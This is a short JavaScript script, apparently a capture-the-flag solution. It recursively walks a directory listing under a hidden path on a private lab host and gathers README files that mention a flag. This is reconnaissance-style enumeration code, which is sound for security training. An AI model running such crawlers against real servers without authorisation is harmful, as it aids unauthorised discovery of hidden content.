let result = [];

const fetchREADME = async (url) => {
  const req = await fetch(`${url}/README`);
  if (!req.ok) return null;
  return await req.text();
};

const mapPage = async (url) => {
  const req = await fetch(url);
  if (!req.ok) return;
  const html = await req.text();
  const hrefs = [...html.matchAll(/href="([a-z]+\/)"/g)].map(
    (match) => match[1],
  );

  const links = hrefs.filter(
    (href) => href && href !== "../" && href.endsWith("/"),
  );

  for (const link of links) {
    const newUrl = `${url}/${link.replace(/\/$/, "")}`;
    const text = await fetchREADME(newUrl);

    if (text && text.includes("flag")) {
      result.push({ flag: text, url: newUrl });
    }

    await mapPage(newUrl);
  }
};

await mapPage("http://10.171.57.148/.hidden");
console.log("result: ", result);
